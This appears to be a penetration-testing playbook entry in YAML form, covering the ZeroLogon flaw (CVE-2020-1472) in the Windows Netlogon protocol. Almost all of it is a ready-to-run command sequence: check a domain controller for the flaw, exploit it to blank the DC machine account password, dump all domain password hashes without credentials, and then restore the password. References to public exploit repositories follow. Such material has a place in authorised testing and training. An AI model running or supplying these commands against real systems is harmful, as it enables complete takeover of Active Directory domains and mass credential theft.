---
description: |
  ZeroLogon (CVE-2020-1472) — exploit Netlogon protocol flaw to zero out the domain controller machine account password and dump all domain hashes without credentials.
commands:
  - have: No_Creds
    cmd: |
      # Test if DC is vulnerable to ZeroLogon
      python3 zerologon_tester.py DC01 10.10.10.27

      # Exploit — set DC machine account password to empty
      python3 cve-2020-1472-exploit.py DC01 10.10.10.27

      # Dump all domain hashes using empty machine account password
      impacket-secretsdump -just-dc -no-pass senshu.local/'DC01$'@10.10.10.27

      # IMPORTANT: Restore the machine account password after exploitation
      # Failing to restore will break AD replication and services
      # Use the DC machine hash obtained from secretsdump to restore:
      python3 restorepassword.py senshu.local/DC01@DC01 -target-ip 10.10.10.27 -hexpass ORIGINAL_HEX_PASSWORD
phase:
  - Exploitation
target_os:
  - Windows
services:
  - Active_Directory
  - RPC
techniques:
  - CVE_Exploit
references:
  - https://github.com/dirkjanm/CVE-2020-1472
  - https://github.com/SecuraBV/CVE-2020-1472
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/cve-2020-1472-zerologon.html
---
